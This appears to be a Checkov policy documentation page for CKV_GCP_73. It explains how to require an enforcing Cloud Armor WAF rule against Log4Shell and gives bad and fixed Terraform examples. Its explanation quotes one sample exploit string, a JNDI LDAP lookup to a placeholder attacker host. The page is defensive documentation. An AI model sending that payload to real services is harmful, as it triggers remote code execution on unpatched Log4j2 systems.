# CKV_GCP_73: Ensure Cloud Armor prevents message lookup in Log4j2 (CVE-2021-44228 / Log4Shell)
## Severity
**MEDIUM** (score: 5.0/10)

Missing a Log4Shell WAF rule on an internet-facing load balancer removes an edge-level compensating control against a mass-exploited, unauthenticated remote-code-execution vulnerability (CVE-2021-44228).

## Summary
This check ensures a `google_compute_security_policy` (Cloud Armor) has an active, enforcing WAF rule blocking the Log4Shell (CVE-2021-44228) exploit pattern before it reaches backend services.

## Applicability
**Checkov framework(s):** `terraform`

- **IaC framework:** Terraform
- **Resource type:** `google_compute_security_policy`

## Why it matters
Log4Shell (CVE-2021-44228) is a critical remote-code-execution vulnerability in the widely-used Apache Log4j2 logging library, exploitable simply by getting a crafted string (e.g. `${jndi:ldap://attacker/a}`) logged by a vulnerable application — commonly delivered via HTTP headers, User-Agent strings, form fields, or any other logged input. Because Log4j2 is transitively pulled in by countless Java frameworks, an organization may have vulnerable instances it isn't even aware of (in third-party dependencies, vendor appliances, etc.), making patching alone unreliable as the sole defense. A Cloud Armor rule using the `cve-canary` preconfigured WAF/expression detects and blocks this exploit pattern at the edge, providing a compensating control even for services that haven't yet been patched or fully audited. Without it, internet-facing HTTP(S) load balancers behind Cloud Armor have no edge-level protection against this exploit class.

## How Checkov evaluates this
Checkov looks at each `rule` block in the security policy (or, via graph traversal, at connected `google_compute_security_policy_rule` resources) for a rule whose match expression is either `evaluatePreconfiguredExpr('cve-canary')` or `evaluatePreconfiguredWaf('cve-canary')`. Having found such a rule:
- If the rule is in `preview` mode (`preview = true`), it FAILS — a preview-mode rule only logs matches, it does not block traffic.
- If the rule's `action` is `"allow"`, it FAILS — the traffic is explicitly permitted rather than denied.
- Otherwise (rule found, not preview, and action denies/blocks the traffic), it PASSES.
- If no rule matching the cve-canary expression exists at all, the check FAILS.

## Non-compliant example
```hcl
resource "google_compute_security_policy" "policy" {
  name = "waf-policy"

  rule {
    action   = "allow"
    priority = "1000"
    match {
      expr {
        expression = "evaluatePreconfiguredExpr('cve-canary')"
      }
    }
    description = "log4shell rule left in allow/preview mode"
  }

  rule {
    action   = "allow"
    priority = "2147483647"
    match {
      versioned_expr = "SRC_IPS_V1"
      config {
        src_ip_ranges = ["*"]
      }
    }
    description = "default rule"
  }
}
```

## Remediated example
```hcl
resource "google_compute_security_policy" "policy" {
  name = "waf-policy"

  rule {
    action   = "deny(403)"
    priority = "1000"
    preview  = false
    match {
      expr {
        expression = "evaluatePreconfiguredExpr('cve-canary')"
      }
    }
    description = "Block Log4Shell (CVE-2021-44228) exploit attempts"
  }

  rule {
    action   = "allow"
    priority = "2147483647"
    match {
      versioned_expr = "SRC_IPS_V1"
      config {
        src_ip_ranges = ["*"]
      }
    }
    description = "default rule"
  }
}
```

## Remediation steps
1. Add a `rule` block to the `google_compute_security_policy` matching `evaluatePreconfiguredExpr('cve-canary')` (or the WAF variant `evaluatePreconfiguredWaf('cve-canary')`).
2. Set `action` to a blocking action such as `deny(403)` — never `allow`.
3. Ensure `preview` is `false` (or omitted, since default is false) so the rule actually enforces rather than just logs.
4. Attach the security policy to the target HTTP(S) load balancer's backend service (`security_policy` attribute on `google_compute_backend_service`).
5. Monitor Cloud Armor logs after rollout for false positives before broadening enforcement, and keep patching Log4j2 in application dependencies — this WAF rule is a compensating control, not a substitute for patching.

## References
- [Checkov check source](https://github.com/bridgecrewio/checkov/blob/main/checkov/terraform/checks/resource/gcp/CloudArmorWAFACLCVE202144228.py)
- [Google Cloud: Cloud Armor preconfigured WAF rules](https://cloud.google.com/armor/docs/rule-tuning)
